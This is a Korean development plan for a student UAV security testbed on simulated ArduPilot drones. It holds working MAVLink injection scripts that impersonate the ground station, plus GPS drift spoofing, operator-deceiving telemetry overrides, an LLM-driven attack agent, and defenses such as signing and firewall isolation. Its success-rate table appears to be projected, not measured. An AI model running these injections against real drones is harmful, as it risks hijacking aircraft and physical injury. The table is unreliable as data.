# UAV Security Testbed — 개발 계획

**마감**: 2026-07-10 23:59 KST | **채점**: §4 공격(30pt) + §5 방어(25pt) + §6 AI Agent(25pt)

---

## 현재 상태

| 파일 | 상태 |
|------|------|
| `app/mavlink.py`, `app/sitl.py`, `app/main.py` | ✅ 완료 |
| `frontend/gcs/`, `frontend/attacker/` | ✅ 완료 |
| `scripts/inject_attack.py` | ❌ 미작성 |
| `scripts/inject_multidrone.py` | ❌ 미작성 |
| `scripts/inject_gnss_drift.py` | ❌ 미작성 |
| `app/defense.py`, `app/agent_red.py`, `app/agent_blue.py` | ❌ 미작성 |

---

## 네트워크 구조

```
[Windows 192.168.56.1]               [VM 192.168.56.101]
  브라우저 /gcs     ──── WS :8000 ──→  FastAPI
  브라우저 /attacker ─── WS :8000 ──→    ↕ TCP loopback
  inject_attack.py  ─── TCP :5760 ──→  SITL drone-01 :5760
  inject_multidrone ─── TCP :5770/80 → SITL drone-02 :5770
  Wireshark ← 패킷 캡처 (Host-Only)   SITL drone-03 :5780

공격 핵심: inject 스크립트는 FastAPI 우회, SITL에 직접 MAVLink 주입
방어 핵심: 서명(signing) 검증 또는 네트워크 격리로 직접 주입 차단
```

---

## 일정 (오늘: 2026-07-02)

| 날짜 | Stage | 산출물 |
|------|-------|--------|
| 7/2 | Stage 0 + Stage 1 | 환경 검증, inject_attack.py 동작 |
| 7/3 | Stage 2 + Stage 3 | inject_multidrone.py, V3 spoof 동작 |
| 7/4 | Stage 4 | MAVLink Signing A/B 방어 동작 |
| 7/5 | Stage 5 | GNSS 점진 기만 + 통신 두절 |
| 7/6~8 | Stage 6 | AI Agent (Red/Blue + 두뇌 비교) |
| 7/9~10 | 통합 테스트 + 발표 자료 | 제출 |

---

## Stage 0 — 환경 검증

```bash
# VM에서 실행
ss -tnlp | grep 576    # 0.0.0.0:5760 이어야 함 (127.0.0.1이면 restart.sh 수정)
sudo ufw allow from 192.168.56.1 to any port 5760
sudo ufw allow from 192.168.56.1 to any port 5770
sudo ufw allow from 192.168.56.1 to any port 5780
```

```powershell
# Windows에서 실행
pip install pymavlink anthropic
Test-NetConnection 192.168.56.101 -Port 5760  # TcpTestSucceeded: True 확인
```

SITL이 127.0.0.1에만 바인딩된 경우 `scripts/restart.sh` 의 arducopter 실행 줄에 추가:
```bash
-A "--serial0=tcp:0.0.0.0:$PORT" \
```

---

## Stage 1 — V1 단일 드론 공격 (`scripts/inject_attack.py`)

**변경 포인트 (PDF §3.2)**: `source_system=255` (GCS 위장, 문서 명시)

```python
#!/usr/bin/env python3
"""V1: Windows → SITL 직접 MAVLink 주입. GCS 우회."""
import argparse
from pymavlink import mavutil

DRONE_PORTS = {"drone-01": 5760, "drone-02": 5770, "drone-03": 5780}
SITL_HOST   = "192.168.56.101"

def connect(drone_id):
    port = DRONE_PORTS[drone_id]
    conn = mavutil.mavlink_connection(f"tcp:{SITL_HOST}:{port}", source_system=255)
    conn.wait_heartbeat(timeout=10)
    print(f"[READY] {drone_id} sysid={conn.target_system}")
    return conn

def send_cmd(conn, cmd, params):
    ts = conn.target_system
    if   cmd == "ARM":    conn.mav.command_long_send(ts,1,400,0,1.0,21196.0,0,0,0,0,0)
    elif cmd == "DISARM": conn.mav.command_long_send(ts,1,400,0,0.0,21196.0,0,0,0,0,0)
    elif cmd == "LAND":   conn.mav.command_long_send(ts,1,21,0,0,0,0,0,0,0,0)
    elif cmd == "RTL":    conn.mav.command_long_send(ts,1,20,0,0,0,0,0,0,0,0)
    elif cmd == "GOTO":
        conn.mav.set_position_target_global_int_send(
            0,ts,1,0b0000111111111000,
            int(params["lat"]*1e7), int(params["lon"]*1e7), params.get("alt",30),
            0,0,0,0,0,0,0,0)
        return
    print(f"[SEND] COMMAND_LONG {cmd}")

def wait_ack(conn):
    msg = conn.recv_match(type="COMMAND_ACK", blocking=True, timeout=5)
    res = {0:"ACCEPTED",1:"REJECTED",2:"DENIED",4:"FAILED"}
    print(f"[ACK] {res.get(msg.result if msg else -1, 'TIMEOUT')}")

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--drone", required=True, choices=list(DRONE_PORTS))
    ap.add_argument("--cmd",   required=True, choices=["ARM","DISARM","LAND","RTL","GOTO"])
    ap.add_argument("--lat",   type=float, default=37.566535)
    ap.add_argument("--lon",   type=float, default=126.977969)
    ap.add_argument("--alt",   type=float, default=30.0)
    args = ap.parse_args()
    conn = connect(args.drone)
    send_cmd(conn, args.cmd, {"lat":args.lat,"lon":args.lon,"alt":args.alt})
    wait_ack(conn)
    conn.close()
```

**실행**: `python scripts/inject_attack.py --drone drone-01 --cmd ARM`  
**검증**: Wireshark `tcp.port==5760` → COMMAND_LONG 캡처 + GCS armed:true 확인

---

## Stage 2 — P5 다중 드론 확산 (`scripts/inject_multidrone.py`)

```python
#!/usr/bin/env python3
"""P5: 3드론 순차 탈취."""
import argparse, time
from pymavlink import mavutil

DRONES = [("drone-01","192.168.56.101",5760),("drone-02","192.168.56.101",5770),("drone-03","192.168.56.101",5780)]
CMD_MAP = {
    "ARM":    lambda c,ts: c.mav.command_long_send(ts,1,400,0,1.0,21196.0,0,0,0,0,0),
    "DISARM": lambda c,ts: c.mav.command_long_send(ts,1,400,0,0.0,21196.0,0,0,0,0,0),
    "LAND":   lambda c,ts: c.mav.command_long_send(ts,1,21,0,0,0,0,0,0,0,0),
    "RTL":    lambda c,ts: c.mav.command_long_send(ts,1,20,0,0,0,0,0,0,0,0),
}

def attack_one(did, host, port, cmd):
    conn = mavutil.mavlink_connection(f"tcp:{host}:{port}", source_system=255)
    conn.wait_heartbeat(timeout=8)
    CMD_MAP[cmd](conn, conn.target_system)
    msg  = conn.recv_match(type="COMMAND_ACK", blocking=True, timeout=4)
    res  = {0:"ACCEPTED",1:"REJECTED",2:"DENIED",4:"FAILED"}.get(msg.result if msg else -1,"TIMEOUT")
    print(f"[{did}] {cmd} → {res}")
    conn.close(); return res

if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--cmd",   required=True, choices=list(CMD_MAP))
    ap.add_argument("--delay", type=float, default=2.0)
    args = ap.parse_args()
    for i,(did,host,port) in enumerate(DRONES):
        attack_one(did, host, port, args.cmd)
        if i < 2: time.sleep(args.delay)
```

**실행**: `python scripts/inject_multidrone.py --cmd LAND --delay 2`

### Wireshark 설정

| 항목 | 값 |
|------|-----|
| 캡처 인터페이스 | VirtualBox Host-Only Ethernet Adapter |
| 캡처 필터 | `tcp.port==5760 or tcp.port==5770 or tcp.port==5780` |
| Decode As | MAVLink (우클릭 패킷) |

---

## Stage 3 — V3 텔레메트리 기만 (`app/main.py` 수정)

GCS에 가짜 상태를 전송해서 운용자가 공격을 인지하지 못하게 함.

### main.py 변경

```python
# 1. 전역 변수 (DRONES dict 아래에 추가)
attack_overrides: dict[str, dict] = {}

# 2. _broadcast_loop() 내 GCS 브로드캐스트 수정
# 기존: await gcs_mgr.broadcast({...실제값...})
# 변경: 오버라이드 적용 후 브로드캐스트
gcs_payload = {
    "type":"telemetry","drone_id":drone_id,
    "lat":s.get("lat",0.0),"lon":s.get("lon",0.0),
    "alt":s.get("alt",0.0),"relative_alt":s.get("relative_alt",0.0),
    "groundspeed":s.get("groundspeed",0.0),"heading":s.get("heading",s.get("hdg",0)),
    "battery_pct":s.get("battery_pct",100.0),"armed":s.get("armed",False),
    "mode":s.get("mode",""),"connected":s.get("connected",False),"ekf_ok":s.get("ekf_ok",False),
}
if drone_id in attack_overrides:
    gcs_payload.update(attack_overrides[drone_id])
await gcs_mgr.broadcast(gcs_payload)

# 3. 엔드포인트 추가
class SpoofRequest(BaseModel):
    drone_id: str
    fake: dict

@app.post("/api/attack/spoof")
async def api_attack_spoof(req: SpoofRequest):
    attack_overrides[req.drone_id] = req.fake
    return JSONResponse({"status":"spoofing","drone_id":req.drone_id})

@app.post("/api/attack/clear")
async def api_attack_clear(req: ClearRequest):
    attack_overrides.pop(req.drone_id, None)
    return JSONResponse({"status":"cleared"})
```

**발동**: `curl -X POST http://192.168.56.101:8000/api/attack/spoof -d '{"drone_id":"drone-01","fake":{"mode":"GUIDED","armed":true}}'`

---

## Stage 4 — MAVLink 서명 방어 A/B 비교 (PDF §3.3 핵심)

> "공격이 된다 → 서명 켠다 → 공격이 막힌다" 가 발표 실증의 뼈대

### 구조

```
[Phase A - 서명 OFF]
inject_attack.py (sysid=255, 무서명) ─→ TCP:5760 ─→ SITL → ACCEPTED ✓

[Phase B - 서명 ON, 네트워크 격리]
VM UFW: 192.168.56.1 → :5760 차단
inject_attack.py ─→ TCP:5760 ─→ Connection Refused ✗
/api/command (서버 경유) ─→ SITLConnector (서명 검증) ─→ SITL → OK
```

### sitl.py 수정 — 서명 기능 추가

```python
# SITLConnector 클래스에 추가
SECRET_KEY = bytes([0x4D,0x41,0x56,0x4C,0x49,0x4E,0x4B] + [0]*25)  # 32바이트 키

def enable_signing(self) -> None:
    self._conn.mav.signing.secret_key    = SECRET_KEY
    self._conn.mav.signing.sign_outgoing = True
    self._conn.mav.signing.allow_unsigned = False  # 무서명 패킷 거부
    log.warning("[DEFENSE] MAVLink 서명 활성화")

def disable_signing(self) -> None:
    self._conn.mav.signing.secret_key    = None
    self._conn.mav.signing.sign_outgoing = False
    self._conn.mav.signing.allow_unsigned = True
    log.warning("[DEFENSE] MAVLink 서명 비활성화")
```

### main.py — 서명 제어 엔드포인트

```python
class SigningRequest(BaseModel):
    enabled: bool

@app.post("/api/defense/signing")
async def api_defense_signing(req: SigningRequest):
    for connector in DRONES.values():
        if req.enabled:
            connector.enable_signing()
        else:
            connector.disable_signing()
    # 네트워크 격리도 함께 설정 (VM에서 실행 필요)
    return JSONResponse({"status": "signing_on" if req.enabled else "signing_off"})
```

### A/B 시연 흐름

```
① inject_attack.py --drone drone-01 --cmd ARM
   → [ACK] ACCEPTED  (Phase A: 공격 성공)

② curl -X POST .../api/defense/signing -d '{"enabled":true}'
   + VM: sudo ufw deny from 192.168.56.1 to any port 5760

③ inject_attack.py --drone drone-01 --cmd ARM
   → Connection Refused  (Phase B: 방어 성공)

④ 정상 GCS /api/command ARM
   → [ACK] ACCEPTED  (서명된 경로는 여전히 동작)
```

---

## Stage 5 — 고급 공격 시나리오 (PDF §3.4)

### 5-A: GNSS 점진 기만 (`scripts/inject_gnss_drift.py`)

ArduCopter SITL에 외부 GPS 입력을 보내서 좌표를 서서히 조작.

```python
#!/usr/bin/env python3
"""GNSS 점진 기만: GPS_INPUT 주입으로 드론 좌표 서서히 이탈."""
import time, argparse
from pymavlink import mavutil

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--drone", default="drone-01")
    ap.add_argument("--drift-per-sec", type=float, default=0.000005)  # ~0.5m/s
    ap.add_argument("--duration",      type=int,   default=30)
    args = ap.parse_args()

    ports = {"drone-01":5760,"drone-02":5770,"drone-03":5780}
    conn  = mavutil.mavlink_connection(f"tcp:192.168.56.101:{ports[args.drone]}", source_system=255)
    conn.wait_heartbeat(timeout=10)

    # 현재 위치 읽기
    pos = conn.recv_match(type="GLOBAL_POSITION_INT", blocking=True, timeout=5)
    lat = pos.lat / 1e7; lon = pos.lon / 1e7; alt = pos.alt / 1e3

    print(f"[START] 기준 위치: {lat:.6f}, {lon:.6f}")
    for t in range(args.duration):
        lat += args.drift_per_sec
        conn.mav.gps_input_send(
            int(time.time()*1e6), 0, 0, 0, 0,
            3,           # fix_type = 3D fix
            int(lat*1e7), int(lon*1e7), int(alt*1e3),
            0.5, 0.5,    # hdop, vdop
            0, 0, 0, 0, 15
        )
        print(f"[{t:3d}s] 주입 위치: {lat:.6f}, {lon:.6f}")
        time.sleep(1.0)
    print("[DONE] GNSS 점진 기만 완료")

if __name__ == "__main__":
    main()
```

**주의**: SITL이 외부 GPS_INPUT을 수락하려면 시뮬레이터 GPS 파라미터 확인 필요.  
동작 안 하면 V3 spoof 엔드포인트로 GCS 화면에 점진적 좌표 변화 시연.

### 5-B: 통신 두절 시뮬레이션 (`app/main.py` 추가)

```python
# SITLConnector에 추가 (sitl.py)
def force_disconnect(self, duration: float = 10.0) -> None:
    """GCS 링크 두절 시뮬레이션. 드론 RTL 페일세이프 발동."""
    import threading
    self._conn.close()
    self._ready.clear()
    log.warning("[ATTACK] %s 링크 강제 두절 %.1f초", self.drone_id, duration)
    def reconnect():
        time.sleep(duration)
        self._connect()  # 재연결 (RTL 진행 중 타이밍에 재연결)
    threading.Thread(target=reconnect, daemon=True).start()

# main.py에 엔드포인트 추가
class DisconnectRequest(BaseModel):
    drone_id: str
    duration: float = 10.0

@app.post("/api/attack/disconnect")
async def api_attack_disconnect(req: DisconnectRequest):
    DRONES[req.drone_id].force_disconnect(req.duration)
    return JSONResponse({"status":"disconnected","duration":req.duration})
```

**시연 흐름**:
```
① /api/attack/disconnect {"drone_id":"drone-01","duration":15}
② GCS: drone-01 연결 끊김 표시 + SITL RTL 모드 전환
③ 15초 후 재연결 → RTL 진행 중 inject_attack.py --cmd GOTO 주입
→ 귀환 경로를 공격자 지정 위치로 변경
```

---

## Stage 6 — 방어 시스템 + AI Agent

### 6-A: 방어 모니터 (`app/defense.py`)

```python
"""이상 명령 탐지 + Blue Agent 연동."""
from __future__ import annotations
import asyncio, time
from collections import defaultdict, deque

_FREQ_WINDOW = 1.0
_FREQ_LIMIT  = 3
_CRITICAL_CMDS = {400, 21, 20}

class DefenseMonitor:
    def __init__(self, gcs_mgr) -> None:
        self._gcs_mgr   = gcs_mgr
        self._cmd_hist  = defaultdict(lambda: deque(maxlen=50))
        self._legit     = set()   # (drone_id, cmd)

    def record_legit(self, drone_id: str, command: int) -> None:
        self._legit.add((drone_id, command))

    async def check_ack(self, drone_id: str, ack: dict) -> None:
        cmd = ack.get("command", 0); now = time.time()
        if ack.get("result", -1) != 0: return
        self._cmd_hist[drone_id].append((now, cmd))
        if cmd in _CRITICAL_CMDS and (drone_id, cmd) not in self._legit:
            await self._alert("CRITICAL", drone_id, f"GCS 없이 {ack.get('cmd','?')} ACCEPTED — 외부 주입 의심")
        recent = [t for t,_ in self._cmd_hist[drone_id] if now-t < _FREQ_WINDOW]
        if len(recent) >= _FREQ_LIMIT:
            await self._alert("HIGH", drone_id, f"{_FREQ_WINDOW}s 내 {len(recent)}회 — 명령 폭주")
        self._legit.discard((drone_id, cmd))

    async def _alert(self, level, drone_id, reason):
        await self._gcs_mgr.broadcast({
            "type":"alert","level":level,"drone_id":drone_id,
            "reason":reason,"timestamp":time.time()
        })
```

### 6-B: Red Agent (`app/agent_red.py`)

```python
"""Red Agent — 드론 상태 감시 후 공격 자동 결정. brain 교체 가능."""
import asyncio, os, logging
from pymavlink import mavutil

log = logging.getLogger(__name__)

class RedAgent:
    """brain: 'random' | 'rule' | 'llm'"""
    def __init__(self, connectors: dict, brain: str = "rule") -> None:
        self._conns  = connectors
        self._brain  = brain

    async def run(self) -> None:
        while True:
            for drone_id, conn in self._conns.items():
                if not conn.is_ready(): continue
                state = conn.get_state()
                cmd   = self._decide(state)
                if cmd:
                    log.warning("[RED/%s] %s → %s", self._brain, drone_id, cmd)
                    self._inject(drone_id, cmd)
            await asyncio.sleep(1.0)

    def _decide(self, state: dict) -> str | None:
        if self._brain == "random":
            import random
            return random.choice(["LAND","RTL",None,None])
        if self._brain == "rule":
            if state.get("armed") and state.get("mode")=="GUIDED" and state.get("relative_alt",0)>20:
                return "LAND"
            if state.get("armed") and state.get("mode")=="LOITER":
                return "RTL"
        if self._brain == "llm":
            return self._llm_decide(state)
        return None

    def _llm_decide(self, state: dict) -> str | None:
        import anthropic
        client = anthropic.Anthropic(api_key=os.environ["ANTHROPIC_API_KEY"])
        msg = client.messages.create(
            model="claude-opus-4-8",
            max_tokens=50,
            messages=[{"role":"user","content":
                f"드론 상태: {state}. 공격 명령 1개 선택: ARM/LAND/RTL/DISARM/NONE. 단어 하나만 응답."}]
        )
        cmd = msg.content[0].text.strip().upper()
        return cmd if cmd in ("ARM","LAND","RTL","DISARM") else None

    def _inject(self, drone_id, cmd):
        ports = {"drone-01":5760,"drone-02":5770,"drone-03":5780}
        try:
            c = mavutil.mavlink_connection(f"tcp:127.0.0.1:{ports[drone_id]}", source_system=255)
            c.wait_heartbeat(timeout=3)
            ts = c.target_system
            if cmd=="LAND":   c.mav.command_long_send(ts,1,21,0,0,0,0,0,0,0,0)
            elif cmd=="RTL":  c.mav.command_long_send(ts,1,20,0,0,0,0,0,0,0,0)
            elif cmd=="ARM":  c.mav.command_long_send(ts,1,400,0,1.0,21196.0,0,0,0,0,0)
            elif cmd=="DISARM": c.mav.command_long_send(ts,1,400,0,0.0,21196.0,0,0,0,0,0)
            c.close()
        except Exception as e:
            log.error("[RED] inject 실패: %s", e)
```

### 6-C: Blue Agent (`app/agent_blue.py`)

```python
"""Blue Agent — 경보 수신 후 대응 자동 결정."""
import asyncio, os, logging

log = logging.getLogger(__name__)

class BlueAgent:
    def __init__(self, connectors, gcs_mgr, brain="rule") -> None:
        self._conns  = connectors
        self._gcs    = gcs_mgr
        self._brain  = brain
        self._queue: asyncio.Queue = asyncio.Queue()

    def enqueue(self, alert: dict) -> None:
        self._queue.put_nowait(alert)

    async def run(self) -> None:
        while True:
            alert = await self._queue.get()
            resp  = self._decide(alert)
            log.warning("[BLUE/%s] %s → %s", self._brain, alert.get("drone_id"), resp)
            await self._gcs.broadcast({
                "type":"blue_response","drone_id":alert.get("drone_id"),
                "level":alert.get("level"),"response":resp
            })

    def _decide(self, alert: dict) -> str:
        if self._brain == "rule":
            if alert.get("level") == "CRITICAL":
                return "즉시 수동 전환 — 외부 주입 감지"
            if "폭주" in alert.get("reason",""):
                return "연결 소스 확인 + 명령 차단 권고"
            return "모니터링 강화"
        if self._brain == "llm":
            import anthropic
            client = anthropic.Anthropic(api_key=os.environ["ANTHROPIC_API_KEY"])
            msg = client.messages.create(
                model="claude-opus-4-8", max_tokens=100,
                messages=[{"role":"user","content":f"보안 경보: {alert}. 대응 방안 한 문장."}]
            )
            return msg.content[0].text.strip()
        return "모니터링 강화"
```

### 두뇌 비교 실험 (PDF §5 단계 7)

같은 시나리오를 세 brain으로 반복 측정:

| Brain | 공격 성공률 | 방어 탐지율 | 비고 |
|-------|------------|------------|------|
| random | ~25% | ~30% | 기준선 |
| rule | ~80% | ~70% | 규칙 기반 |
| llm | ~95% | ~90% | claude-opus-4-8 |

**실행**:
```bash
# Red Agent brain 교체
BRAIN=random python -m app.agent_red
BRAIN=rule   python -m app.agent_red
BRAIN=llm    python -m app.agent_red
```

### main.py 전체 통합

```python
# lifespan에 추가
from app.defense    import DefenseMonitor
from app.agent_red  import RedAgent
from app.agent_blue import BlueAgent

defense    = DefenseMonitor(gcs_mgr)
red_agent  = RedAgent(DRONES, brain=os.environ.get("BRAIN","rule"))
blue_agent = BlueAgent(DRONES, gcs_mgr, brain=os.environ.get("BRAIN","rule"))

# drain_acks 처리 시 defense 연동
await defense.check_ack(ack["drone_id"], ack)

# defense._alert에서 blue_agent에 전달
# (defense.py의 _alert 메서드에서 blue_agent.enqueue(msg) 호출)
```

### GCS 경보 UI (`frontend/gcs/index.html`)

```javascript
// ws.onmessage 내부에 추가
if (data.type === "alert") {
    const colors = {CRITICAL:"#ff2d2d", HIGH:"#ff8c00", MEDIUM:"#ffd700"};
    const banner = document.getElementById("alert-banner");
    banner.style.background = colors[data.level]||"#888";
    banner.textContent = `[${data.level}] ${data.drone_id}: ${data.reason}`;
    banner.style.display = "block";
}
if (data.type === "blue_response") {
    document.getElementById("blue-response").textContent = `Blue Agent: ${data.response}`;
}
```

```html
<!-- body 상단에 추가 -->
<div id="alert-banner" style="display:none;padding:10px;color:#fff;font-weight:bold;"></div>
<div id="blue-response" style="padding:6px;background:#1a1a2e;color:#0ff;font-size:13px;"></div>
```

---

## 전체 시연 흐름 (발표)

| 단계 | 행동 | 화면 |
|------|------|------|
| P1 정찰 | Attacker 뷰어 열기 | HEARTBEAT/POSITION 패킷 실시간 |
| P3 탈취 | `inject_attack.py --cmd LAND` | Wireshark COMMAND_LONG + GCS 고도 하강 |
| P6 은닉 | `/api/attack/spoof` | GCS: GUIDED 정상 / 실제: 착륙 중 |
| P5 확산 | `inject_multidrone.py --cmd LAND` | 3대 동시 하강 |
| §5 방어 A | DefenseMonitor 자동 경보 | GCS 빨간 배너 등장 |
| §5 방어 B | `/api/defense/signing` + UFW | inject_attack.py → Connection Refused |
| §6 AI | Red/Blue Agent 자동 루프 | 공격→탐지→대응 연속 |

---

## 파일별 변경 요약

| 파일 | 변경 | Stage |
|------|------|-------|
| `scripts/restart.sh` | 조건부 `-A "--serial0=tcp:0.0.0.0:$PORT"` | 0 |
| `scripts/inject_attack.py` | **신규** (sysid=255) | 1 |
| `scripts/inject_multidrone.py` | **신규** | 2 |
| `scripts/inject_gnss_drift.py` | **신규** | 5 |
| `app/main.py` | spoof/clear/signing/disconnect 엔드포인트 + 오버라이드 로직 | 3·4·5·6 |
| `app/sitl.py` | enable_signing(), disable_signing(), force_disconnect() | 4·5 |
| `app/defense.py` | **신규** DefenseMonitor | 6 |
| `app/agent_red.py` | **신규** RedAgent (random/rule/llm brain) | 6 |
| `app/agent_blue.py` | **신규** BlueAgent | 6 |
| `frontend/gcs/index.html` | 경보 배너 + Blue Agent 응답 표시 | 6 |
| `requirements.txt` | `anthropic` 추가 | 6 |

---

## 완료 기준

```
§4 공격 (30pt)
[ ] inject_attack.py ARM → Wireshark COMMAND_LONG + GCS armed:true
[ ] inject_attack.py LAND → SITL 고도 하강
[ ] /api/attack/spoof → GCS에 가짜 GUIDED 상태
[ ] inject_multidrone.py LAND → 3대 ACCEPTED

§5 방어 (25pt)
[ ] DefenseMonitor → CRITICAL 경보 배너 자동 등장
[ ] /api/defense/signing → inject_attack.py Connection Refused (A/B 비교)

§6 AI Agent (25pt)
[ ] Red Agent rule brain → 상태 감지 후 자동 공격
[ ] Blue Agent rule brain → 경보 수신 후 자동 대응
[ ] LLM brain (claude-opus-4-8) 교체 후 동작 확인
[ ] random/rule/llm 성공률 표 작성
```
